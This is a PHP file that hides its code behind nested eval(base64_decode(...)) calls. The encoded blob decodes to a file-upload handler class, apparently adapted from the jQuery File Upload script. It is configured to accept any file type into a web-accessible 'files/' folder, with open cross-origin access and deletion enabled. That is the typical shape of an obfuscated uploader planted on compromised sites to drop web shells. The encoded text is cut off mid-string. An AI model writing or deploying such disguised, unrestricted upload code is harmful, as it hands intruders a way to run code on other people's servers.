<?php function ukRRuVksbeVLPTHbDdAJ($xOnwzgoejx){$r=base64_decode("YmFzZTY0X2RlY29kZSgkeE9ud3pnb2VqeCk=");return eval("return $r;");} eval('?>'.ukRRuVksbeVLPTHbDdAJ('PD9waHAKCgpjbGFzcyBVcGxvYWRIYW5kbGVyIHsKCiAgICBwcm90ZWN0ZWQgJG9wdGlvbnM7CgogICAgICAgICAgICBwcm90ZWN0ZWQgJGVycm9yX21lc3NhZ2VzID0gYXJyYXkoCiAgICAgICAgMSA9PiAnVGhlIHVwbG9hZGVkIGZpbGUgZXhjZWVkcyB0aGUgdXBsb2FkX21heF9maWxlc2l6ZSBkaXJlY3RpdmUgaW4gcGhwLmluaScsCiAgICAgICAgMiA9PiAnVGhlIHVwbG9hZGVkIGZpbGUgZXhjZWVkcyB0aGUgTUFYX0ZJTEVfU0laRSBkaXJlY3RpdmUgdGhhdCB3YXMgc3BlY2lmaWVkIGluIHRoZSBIVE1MIGZvcm0nLAogICAgICAgIDMgPT4gJ1RoZSB1cGxvYWRlZCBmaWxlIHdhcyBvbmx5IHBhcnRpYWxseSB1cGxvYWRlZCcsCiAgICAgICAgNCA9PiAnTm8gZmlsZSB3YXMgdXBsb2FkZWQnLAogICAgICAgIDYgPT4gJ01pc3NpbmcgYSB0ZW1wb3JhcnkgZm9sZGVyJywKICAgICAgICA3ID0+ICdGYWlsZWQgdG8gd3JpdGUgZmlsZSB0byBkaXNrJywKICAgICAgICA4ID0+ICdBIFBIUCBleHRlbnNpb24gc3RvcHBlZCB0aGUgZmlsZSB1cGxvYWQnLAogICAgICAgICdwb3N0X21heF9zaXplJyA9PiAnVGhlIHVwbG9hZGVkIGZpbGUgZXhjZWVkcyB0aGUgcG9zdF9tYXhfc2l6ZSBkaXJlY3RpdmUgaW4gcGhwLmluaScsCiAgICAgICAgJ21heF9maWxlX3NpemUnID0+ICdGaWxlIGlzIHRvbyBiaWcnLAogICAgICAgICdtaW5fZmlsZV9zaXplJyA9PiAnRmlsZSBpcyB0b28gc21hbGwnLAogICAgICAgICdhY2NlcHRfZmlsZV90eXBlcycgPT4gJ0ZpbGV0eXBlIG5vdCBhbGxvd2VkJywKICAgICAgICAnbWF4X251bWJlcl9vZl9maWxlcycgPT4gJ01heGltdW0gbnVtYmVyIG9mIGZpbGVzIGV4Y2VlZGVkJywKICAgICAgICAnbWF4X3dpZHRoJyA9PiAnSW1hZ2UgZXhjZWVkcyBtYXhpbXVtIHdpZHRoJywKICAgICAgICAnbWluX3dpZHRoJyA9PiAnSW1hZ2UgcmVxdWlyZXMgYSBtaW5pbXVtIHdpZHRoJywKICAgICAgICAnbWF4X2hlaWdodCcgPT4gJ0ltYWdlIGV4Y2VlZHMgbWF4aW11bSBoZWlnaHQnLAogICAgICAgICdtaW5faGVpZ2h0JyA9PiAnSW1hZ2UgcmVxdWlyZXMgYSBtaW5pbXVtIGhlaWdodCcsCiAgICAgICAgJ2Fib3J0JyA9PiAnRmlsZSB1cGxvYWQgYWJvcnRlZCcsCiAgICAgICAgJ2ltYWdlX3Jlc2l6ZScgPT4gJ0ZhaWxlZCB0byByZXNpemUgaW1hZ2UnCiAgICApOwoKICAgIHByb3RlY3RlZCAkaW1hZ2Vfb2JqZWN0cyA9IGFycmF5KCk7CgogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRvcHRpb25zID0gbnVsbCwgJGluaXRpYWxpemUgPSB0cnVlLCAkZXJyb3JfbWVzc2FnZXMgPSBudWxsKSB7CiAgICAgICAgJHRoaXMtPnJlc3BvbnNlID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+b3B0aW9ucyA9IGFycmF5KAogICAgICAgICAgICAnc2NyaXB0X3VybCcgPT4gJHRoaXMtPmdldF9mdWxsX3VybCgpLicvJy4kdGhpcy0+YmFzZW5hbWUoJHRoaXMtPmdldF9zZXJ2ZXJfdmFyKCdTQ1JJUFRfTkFNRScpKSwKICAgICAgICAgICAgJ3VwbG9hZF9kaXInID0+IGRpcm5hbWUoJHRoaXMtPmdldF9zZXJ2ZXJfdmFyKCdTQ1JJUFRfRklMRU5BTUUnKSkuJy9maWxlcy8nLAogICAgICAgICAgICAndXBsb2FkX3VybCcgPT4gJHRoaXMtPmdldF9mdWxsX3VybCgpLicvZmlsZXMvJywKICAgICAgICAgICAgJ2lucHV0X3N0cmVhbScgPT4gJ3BocDovL2lucHV0JywKICAgICAgICAgICAgJ3VzZXJfZGlycycgPT4gZmFsc2UsCiAgICAgICAgICAgICdta2Rpcl9tb2RlJyA9PiAwNzU1LAogICAgICAgICAgICAncGFyYW1fbmFtZScgPT4gJ2ZpbGVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RlbGV0ZV90eXBlJyA9PiAnREVMRVRFJywKICAgICAgICAgICAgJ2FjY2Vzc19jb250cm9sX2FsbG93X29yaWdpbicgPT4gJyonLAogICAgICAgICAgICAnYWNjZXNzX2NvbnRyb2xfYWxsb3dfY3JlZGVudGlhbHMnID0+IGZhbHNlLAogICAgICAgICAgICAnYWNjZXNzX2NvbnRyb2xfYWxsb3dfbWV0aG9kcycgPT4gYXJyYXkoCiAgICAgICAgICAgICAgICAnT1BUSU9OUycsCiAgICAgICAgICAgICAgICAnSEVBRCcsCiAgICAgICAgICAgICAgICAnR0VUJywKICAgICAgICAgICAgICAgICdQT1NUJywKICAgICAgICAgICAgICAgICdQVVQnLAogICAgICAgICAgICAgICAgJ1BBVENIJywKICAgICAgICAgICAgICAgICdERUxFVEUnCiAgICAgICAgICAgICksCiAgICAgICAgICAgICdhY2Nlc3NfY29udHJvbF9hbGxvd19oZWFkZXJzJyA9PiBhcnJheSgKICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnLAogICAgICAgICAgICAgICAgJ0NvbnRlbnQtUmFuZ2UnLAogICAgICAgICAgICAgICAgJ0NvbnRlbnQtRGlzcG9zaXRpb24nCiAgICAgICAgICAgICksCiAgICAgICAgICAgICAgICAgICAgICAgICdyZWRpcmVjdF9hbGxvd190YXJnZXQnID0+ICcvXicucHJlZ19xdW90ZSgKICAgICAgICAgICAgICBwYXJzZV91cmwoJHRoaXMtPmdldF9zZXJ2ZXJfdmFyKCdIVFRQX1JFRkVSRVInKSwgUEhQX1VSTF9TQ0hFTUUpCiAgICAgICAgICAgICAgICAuJzovLycKICAgICAgICAgICAgICAgIC5wYXJzZV91cmwoJHRoaXMtPmdldF9zZXJ2ZXJfdmFyKCdIVFRQX1JFRkVSRVInKSwgUEhQX1VSTF9IT1NUKQogICAgICAgICAgICAgICAgLicvJywgICAgICAgICAgICAgICAnLycgICAgICAgICAgICAgKS4nLycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdkb3dubG9hZF92aWFfcGhwJyA9PiBmYWxzZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3JlYWRmaWxlX2NodW5rX3NpemUnID0+IDEwICogMTAyNCAqIDEwMjQsICAgICAgICAgICAgICAgICAgICAgICAgICdpbmxpbmVfZmlsZV90eXBlcycgPT4gJy9cLihnaWZ8anBlP2d8cG5nKSQvaScsCiAgICAgICAgICAgICAgICAgICAgICAgICdhY2NlcHRfZmlsZV90eXBlcycgPT4gJy8uKyQvaScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdtYXhfZmlsZV9zaXplJyA9PiBudWxsLAogICAgICAgICAgICAnbWluX2ZpbGVfc2l6ZScgPT4gMSwKICAgICAgICAgICAgICAgICAgICAgICAgJ21heF9udW1iZXJfb2ZfZmlsZXMnID0+IG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgICdpbWFnZV9maWxlX3R5cGVzJyA9PiAnL1wuKGdpZnxqcGU/Z3xwbmcpJC9pJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvcnJlY3RfaW1hZ2VfZXh0ZW5zaW9ucycgPT4gZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgICdtYXhfd2lkdGgnID0+IG51bGwsCiAgICAgICAgICAgICdtYXhfaGVpZ2h0JyA9PiBudWxsLAogICAgICAgICAgICAnbWluX3dpZHRoJyA9PiAxLAogICAgICAgICAgICAnbWluX2hlaWdodCcgPT4gMSwKICAgICAgICAgICAgICAgICAgICAgICAgJ2Rpc2NhcmRfYWJvcnRlZF91cGxvYWRzJyA9PiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW1hZ2VfbGlicmFyeScgPT4gMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICdjb252ZXJ0X2JpbicgPT4gJ2NvbnZlcnQnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJ2lkZW50aWZ5X2JpbicgPT4gJ2lkZW50aWZ5JywKICAgICAgICAgICAgJ2ltYWdlX3ZlcnNpb25zJyA9PiBhcnJheSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJyA9PiBhcnJheSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhdXRvX29yaWVudCcgPT4gdHJ1ZQogICAgICAgICAgICAgICAgKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICd0aHVtYm5haWwnID0+IGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ21heF93aWR0aCcgPT4gODAsCiAgICAgICAgICAgICAgICAgICAgJ21heF9oZWlnaHQnID0+IDgwCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICksCiAgICAgICAgICAgICdwcmludF9yZXNwb25zZScgPT4gdHJ1ZQogICAgICAgICk7CiAgICAgICAgaWYgKCRvcHRpb25zKSB7CiAgICAgICAgICAgICR0aGlzLT5vcHRpb25zID0gJG9wdGlvbnMgKyAkdGhpcy0+b3B0aW9uczsKICAgICAgICB9CiAgICAgICAgaWYgKCRlcnJvcl9tZXNzYWdlcykgewogICAgICAgICAgICAkdGhpcy0+ZXJyb3JfbWVzc2FnZXMgPSAkZXJyb3JfbWVzc2FnZXMgKyAkdGhpcy0+ZXJyb3JfbWVzc2FnZXM7CiAgICAgICAgfQogICAgICAgIGlmICgkaW5pdGlhbGl6ZSkgewogICAgICAgICAgICAkdGhpcy0+aW5pdGlhbGl6ZSgpOwogICAgICAgIH0KICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gaW5pdGlhbGl6ZSgpIHsKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5nZXRfc2VydmVyX3ZhcignUkVRVUVTVF9NRVRIT0QnKSkgewogICAgICAgICAgICBjYXNlICdPUFRJT05TJzoKICAgICAgICAgICAgY2FzZSAnSEVBRCc6CiAgICAgICAgICAgICAgICAkdGhpcy0+aGVhZCgpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ0dFVCc6CiAgICAgICAgICAgICAgICAkdGhpcy0+Z2V0KCR0aGlzLT5vcHRpb25zWydwcmludF9yZXNwb25zZSddKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdQQVRDSCc6CiAgICAgICAgICAgIGNhc2UgJ1BVVCc6CiAgICAgICAgICAgIGNhc2UgJ1BPU1QnOgogICAgICAgICAgICAgICAgJHRoaXMtPnBvc3QoJHRoaXMtPm9wdGlvbnNbJ3ByaW50X3Jlc3BvbnNlJ10pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ0RFTEVURSc6CiAgICAgICAgICAgICAgICAkdGhpcy0+ZGVsZXRlKCR0aGlzLT5vcHRpb25zWydwcmludF9yZXNwb25zZSddKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgJHRoaXMtPmhlYWRlcignSFRUUC8xLjEgNDA1IE1ldGhvZCBOb3QgQWxsb3dlZCcpOwogICAgICAgIH0KICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X2Z1bGxfdXJsKCkgewogICAgICAgICRodHRwcyA9ICFlbXB0eSgkX1NFUlZFUlsnSFRUUFMnXSkgJiYgc3RyY2FzZWNtcCgkX1NFUlZFUlsnSFRUUFMnXSwgJ29uJykgPT09IDAgfHwKICAgICAgICAgICAgIWVtcHR5KCRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX1BST1RPJ10pICYmCiAgICAgICAgICAgICAgICBzdHJjYXNlY21wKCRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX1BST1RPJ10sICdodHRwcycpID09PSAwOwogICAgICAgIHJldHVybgogICAgICAgICAgICAoJGh0dHBzID8gJ2h0dHBzOi8vJyA6ICdodHRwOi8vJykuCiAgICAgICAgICAgICghZW1wdHkoJF9TRVJWRVJbJ1JFTU9URV9VU0VSJ10pID8gJF9TRVJWRVJbJ1JFTU9URV9VU0VSJ10uJ0AnIDogJycpLgogICAgICAgICAgICAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSA/ICRfU0VSVkVSWydIVFRQX0hPU1QnXSA6ICgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4KICAgICAgICAgICAgKCRodHRwcyAmJiAkX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSA9PT0gNDQzIHx8CiAgICAgICAgICAgICRfU0VSVkVSWydTRVJWRVJfUE9SVCddID09PSA4MCA/ICcnIDogJzonLiRfU0VSVkVSWydTRVJWRVJfUE9SVCddKSkpLgogICAgICAgICAgICBzdWJzdHIoJF9TRVJWRVJbJ1NDUklQVF9OQU1FJ10sMCwgc3RycnBvcygkX1NFUlZFUlsnU0NSSVBUX05BTUUnXSwgJy8nKSk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldF91c2VyX2lkKCkgewogICAgICAgIEBzZXNzaW9uX3N0YXJ0KCk7CiAgICAgICAgcmV0dXJuIHNlc3Npb25faWQoKTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X3VzZXJfcGF0aCgpIHsKICAgICAgICBpZiAoJHRoaXMtPm9wdGlvbnNbJ3VzZXJfZGlycyddKSB7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+Z2V0X3VzZXJfaWQoKS4nLyc7CiAgICAgICAgfQogICAgICAgIHJldHVybiAnJzsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X3VwbG9hZF9wYXRoKCRmaWxlX25hbWUgPSBudWxsLCAkdmVyc2lvbiA9IG51bGwpIHsKICAgICAgICAkZmlsZV9uYW1lID0gJGZpbGVfbmFtZSA/ICRmaWxlX25hbWUgOiAnJzsKICAgICAgICBpZiAoZW1wdHkoJHZlcnNpb24pKSB7CiAgICAgICAgICAgICR2ZXJzaW9uX3BhdGggPSAnJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdmVyc2lvbl9kaXIgPSBAJHRoaXMtPm9wdGlvbnNbJ2ltYWdlX3ZlcnNpb25zJ11bJHZlcnNpb25dWyd1cGxvYWRfZGlyJ107CiAgICAgICAgICAgIGlmICgkdmVyc2lvbl9kaXIpIHsKICAgICAgICAgICAgICAgIHJldHVybiAkdmVyc2lvbl9kaXIuJHRoaXMtPmdldF91c2VyX3BhdGgoKS4kZmlsZV9uYW1lOwogICAgICAgICAgICB9CiAgICAgICAgICAgICR2ZXJzaW9uX3BhdGggPSAkdmVyc2lvbi4nLyc7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGhpcy0+b3B0aW9uc1sndXBsb2FkX2RpciddLiR0aGlzLT5nZXRfdXNlcl9wYXRoKCkKICAgICAgICAgICAgLiR2ZXJzaW9uX3BhdGguJGZpbGVfbmFtZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X3F1ZXJ5X3NlcGFyYXRvcigkdXJsKSB7CiAgICAgICAgcmV0dXJuIHN0cnBvcygkdXJsLCAnPycpID09PSBmYWxzZSA/ICc/JyA6ICcmJzsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X2Rvd25sb2FkX3VybCgkZmlsZV9uYW1lLCAkdmVyc2lvbiA9IG51bGwsICRkaXJlY3QgPSBmYWxzZSkgewogICAgICAgIGlmICghJGRpcmVjdCAmJiAkdGhpcy0+b3B0aW9uc1snZG93bmxvYWRfdmlhX3BocCddKSB7CiAgICAgICAgICAgICR1cmwgPSAkdGhpcy0+b3B0aW9uc1snc2NyaXB0X3VybCddCiAgICAgICAgICAgICAgICAuJHRoaXMtPmdldF9xdWVyeV9zZXBhcmF0b3IoJHRoaXMtPm9wdGlvbnNbJ3NjcmlwdF91cmwnXSkKICAgICAgICAgICAgICAgIC4kdGhpcy0+Z2V0X3Npbmd1bGFyX3BhcmFtX25hbWUoKQogICAgICAgICAgICAgICAgLic9Jy5yYXd1cmxlbmNvZGUoJGZpbGVfbmFtZSk7CiAgICAgICAgICAgIGlmICgkdmVyc2lvbikgewogICAgICAgICAgICAgICAgJHVybCAuPSAnJnZlcnNpb249Jy5yYXd1cmxlbmNvZGUoJHZlcnNpb24pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkdXJsLicmZG93bmxvYWQ9MSc7CiAgICAgICAgfQogICAgICAgIGlmIChlbXB0eSgkdmVyc2lvbikpIHsKICAgICAgICAgICAgJHZlcnNpb25fcGF0aCA9ICcnOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR2ZXJzaW9uX3VybCA9IEAkdGhpcy0+b3B0aW9uc1snaW1hZ2VfdmVyc2lvbnMnXVskdmVyc2lvbl1bJ3VwbG9hZF91cmwnXTsKICAgICAgICAgICAgaWYgKCR2ZXJzaW9uX3VybCkgewogICAgICAgICAgICAgICAgcmV0dXJuICR2ZXJzaW9uX3VybC4kdGhpcy0+Z2V0X3VzZXJfcGF0aCgpLnJhd3VybGVuY29kZSgkZmlsZV9uYW1lKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkdmVyc2lvbl9wYXRoID0gcmF3dXJsZW5jb2RlKCR2ZXJzaW9uKS4nLyc7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGhpcy0+b3B0aW9uc1sndXBsb2FkX3VybCddLiR0aGlzLT5nZXRfdXNlcl9wYXRoKCkKICAgICAgICAgICAgLiR2ZXJzaW9uX3BhdGgucmF3dXJsZW5jb2RlKCRmaWxlX25hbWUpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRfYWRkaXRpb25hbF9maWxlX3Byb3BlcnRpZXMoJGZpbGUpIHsKICAgICAgICAkZmlsZS0+ZGVsZXRlVXJsID0gJHRoaXMtPm9wdGlvbnNbJ3NjcmlwdF91cmwnXQogICAgICAgICAgICAuJHRoaXMtPmdldF9xdWVyeV9zZXBhcmF0b3IoJHRoaXMtPm9wdGlvbnNbJ3NjcmlwdF91cmwnXSkKICAgICAgICAgICAgLiR0aGlzLT5nZXRfc2luZ3VsYXJfcGFyYW1fbmFtZSgpCiAgICAgICAgICAgIC4nPScucmF3dXJsZW5jb2RlKCRmaWxlLT5uYW1lKTsKICAgICAgICAkZmlsZS0+ZGVsZXRlVHlwZSA9ICR0aGlzLT5vcHRpb25zWydkZWxldGVfdHlwZSddOwogICAgICAgIGlmICgkZmlsZS0+ZGVsZXRlVHlwZSAhPT0gJ0RFTEVURScpIHsKICAgICAgICAgICAgJGZpbGUtPmRlbGV0ZVVybCAuPSAnJl9tZXRob2Q9REVMRVRFJzsKICAgICAgICB9CiAgICAgICAgaWYgKCR0aGlzLT5vcHRpb25zWydhY2Nlc3NfY29udHJvbF9hbGxvd19jcmVkZW50aWFscyddKSB7CiAgICAgICAgICAgICRmaWxlLT5kZWxldGVXaXRoQ3JlZGVudGlhbHMgPSB0cnVlOwogICAgICAgIH0KICAgIH0KCiAgICAgICAgICAgIHByb3RlY3RlZCBmdW5jdGlvbiBmaXhfaW50ZWdlcl9vdmVyZmxvdygkc2l6ZSkgewogICAgICAgIGlmICgkc2l6ZSA8IDApIHsKICAgICAgICAgICAgJHNpemUgKz0gMi4wICogKFBIUF9JTlRfTUFYICsgMSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkc2l6ZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X2ZpbGVfc2l6ZSgkZmlsZV9wYXRoLCAkY2xlYXJfc3RhdF9jYWNoZSA9IGZhbHNlKSB7CiAgICAgICAgaWYgKCRjbGVhcl9zdGF0X2NhY2hlKSB7CiAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcpID49IDApIHsKICAgICAgICAgICAgICAgIGNsZWFyc3RhdGNhY2hlKHRydWUsICRmaWxlX3BhdGgpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgY2xlYXJzdGF0Y2FjaGUoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPmZpeF9pbnRlZ2VyX292ZXJmbG93KGZpbGVzaXplKCRmaWxlX3BhdGgpKTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gaXNfdmFsaWRfZmlsZV9vYmplY3QoJGZpbGVfbmFtZSkgewogICAgICAgICRmaWxlX3BhdGggPSAkdGhpcy0+Z2V0X3VwbG9hZF9wYXRoKCRmaWxlX25hbWUpOwogICAgICAgIGlmIChpc19maWxlKCRmaWxlX3BhdGgpICYmICRmaWxlX25hbWVbMF0gIT09ICcuJykgewogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfZmlsZV9vYmplY3QoJGZpbGVfbmFtZSkgewogICAgICAgIGlmICgkdGhpcy0+aXNfdmFsaWRfZmlsZV9vYmplY3QoJGZpbGVfbmFtZSkpIHsKICAgICAgICAgICAgJGZpbGUgPSBuZXcgXHN0ZENsYXNzKCk7CiAgICAgICAgICAgICRmaWxlLT5uYW1lID0gJGZpbGVfbmFtZTsKICAgICAgICAgICAgJGZpbGUtPnNpemUgPSAkdGhpcy0+Z2V0X2ZpbGVfc2l6ZSgKICAgICAgICAgICAgICAgICR0aGlzLT5nZXRfdXBsb2FkX3BhdGgoJGZpbGVfbmFtZSkKICAgICAgICAgICAgKTsKICAgICAgICAgICAgJGZpbGUtPnVybCA9ICR0aGlzLT5nZXRfZG93bmxvYWRfdXJsKCRmaWxlLT5uYW1lKTsKICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPm9wdGlvbnNbJ2ltYWdlX3ZlcnNpb25zJ10gYXMgJHZlcnNpb24gPT4gJG9wdGlvbnMpIHsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHZlcnNpb24pKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2ZpbGUoJHRoaXMtPmdldF91cGxvYWRfcGF0aCgkZmlsZV9uYW1lLCAkdmVyc2lvbikpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRmaWxlLT57JHZlcnNpb24uJ1VybCd9ID0gJHRoaXMtPmdldF9kb3dubG9hZF91cmwoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmlsZS0+bmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2ZXJzaW9uCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICR0aGlzLT5zZXRfYWRkaXRpb25hbF9maWxlX3Byb3BlcnRpZXMoJGZpbGUpOwogICAgICAgICAgICByZXR1cm4gJGZpbGU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBudWxsOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfZmlsZV9vYmplY3RzKCRpdGVyYXRpb25fbWV0aG9kID0gJ2dldF9maWxlX29iamVjdCcpIHsKICAgICAgICAkdXBsb2FkX2RpciA9ICR0aGlzLT5nZXRfdXBsb2FkX3BhdGgoKTsKICAgICAgICBpZiAoIWlzX2RpcigkdXBsb2FkX2RpcikpIHsKICAgICAgICAgICAgcmV0dXJuIGFycmF5KCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBhcnJheV92YWx1ZXMoYXJyYXlfZmlsdGVyKGFycmF5X21hcCgKICAgICAgICAgICAgYXJyYXkoJHRoaXMsICRpdGVyYXRpb25fbWV0aG9kKSwKICAgICAgICAgICAgc2NhbmRpcigkdXBsb2FkX2RpcikKICAgICAgICApKSk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGNvdW50X2ZpbGVfb2JqZWN0cygpIHsKICAgICAgICByZXR1cm4gY291bnQoJHRoaXMtPmdldF9maWxlX29iamVjdHMoJ2lzX3ZhbGlkX2ZpbGVfb2JqZWN0JykpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfZXJyb3JfbWVzc2FnZSgkZXJyb3IpIHsKICAgICAgICByZXR1cm4gaXNzZXQoJHRoaXMtPmVycm9yX21lc3NhZ2VzWyRlcnJvcl0pID8KICAgICAgICAgICAgJHRoaXMtPmVycm9yX21lc3NhZ2VzWyRlcnJvcl0gOiAkZXJyb3I7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGdldF9jb25maWdfYnl0ZXMoJHZhbCkgewogICAgICAgICR2YWwgPSB0cmltKCR2YWwpOwogICAgICAgICRsYXN0ID0gc3RydG9sb3dlcigkdmFsW3N0cmxlbigkdmFsKS0xXSk7CiAgICAgICAgJHZhbCA9IChpbnQpJHZhbDsKICAgICAgICBzd2l0Y2ggKCRsYXN0KSB7CiAgICAgICAgICAgIGNhc2UgJ2cnOgogICAgICAgICAgICAgICAgJHZhbCAqPSAxMDI0OwogICAgICAgICAgICBjYXNlICdtJzoKICAgICAgICAgICAgICAgICR2YWwgKj0gMTAyNDsKICAgICAgICAgICAgY2FzZSAnayc6CiAgICAgICAgICAgICAgICAkdmFsICo9IDEwMjQ7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGhpcy0+Zml4X2ludGVnZXJfb3ZlcmZsb3coJHZhbCk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHZhbGlkYXRlKCR1cGxvYWRlZF9maWxlLCAkZmlsZSwgJGVycm9yLCAkaW5kZXgpIHsKICAgICAgICBpZiAoJGVycm9yKSB7CiAgICAgICAgICAgICRmaWxlLT5lcnJvciA9ICR0aGlzLT5nZXRfZXJyb3JfbWVzc2FnZSgkZXJyb3IpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICRjb250ZW50X2xlbmd0aCA9ICR0aGlzLT5maXhfaW50ZWdlcl9vdmVyZmxvdygKICAgICAgICAgICAgKGludCkkdGhpcy0+Z2V0X3NlcnZlcl92YXIoJ0NPTlRFTlRfTEVOR1RIJykKICAgICAgICApOwogICAgICAgICRwb3N0X21heF9zaXplID0gJHRoaXMtPmdldF9jb25maWdfYnl0ZXMoaW5pX2dldCgncG9zdF9tYXhfc2l6ZScpKTsKICAgICAgICBpZiAoJHBvc3RfbWF4X3NpemUgJiYgKCRjb250ZW50X2xlbmd0aCA+ICRwb3N0X21heF9zaXplKSkgewogICAgICAgICAgICAkZmlsZS0+ZXJyb3IgPSAkdGhpcy0+Z2V0X2Vycm9yX21lc3NhZ2UoJ3Bvc3RfbWF4X3NpemUnKTsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoIXByZWdfbWF0Y2goJHRoaXMtPm9wdGlvbnNbJ2FjY2VwdF9maWxlX3R5cGVzJ10sICRmaWxlLT5uYW1lKSkgewogICAgICAgICAgICAkZmlsZS0+ZXJyb3IgPSAkdGhpcy0+Z2V0X2Vycm9yX21lc3NhZ2UoJ2FjY2VwdF9maWxlX3R5cGVzJyk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKCR1cGxvYWRlZF9maWxlICYmIGlzX3VwbG9hZGVkX2ZpbGUoJHVwbG9hZGVkX2ZpbGUpKSB7CiAgICAgICAgICAgICRmaWxlX3NpemUgPSAkdGhpcy0+Z2V0X2ZpbGVfc2l6ZSgkdXBsb2FkZWRfZmlsZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGZpbGVfc2l6ZSA9ICRjb250ZW50X2xlbmd0aDsKICAgICAgICB9CiAgICAgICAgaWYgKCR0aGlzLT5vcHRpb25zWydtYXhfZmlsZV9zaXplJ10gJiYgKAogICAgICAgICAgICAgICAgJGZpbGVfc2l6ZSA+ICR0aGlzLT5vcHRpb25zWydtYXhfZmlsZV9zaXplJ10g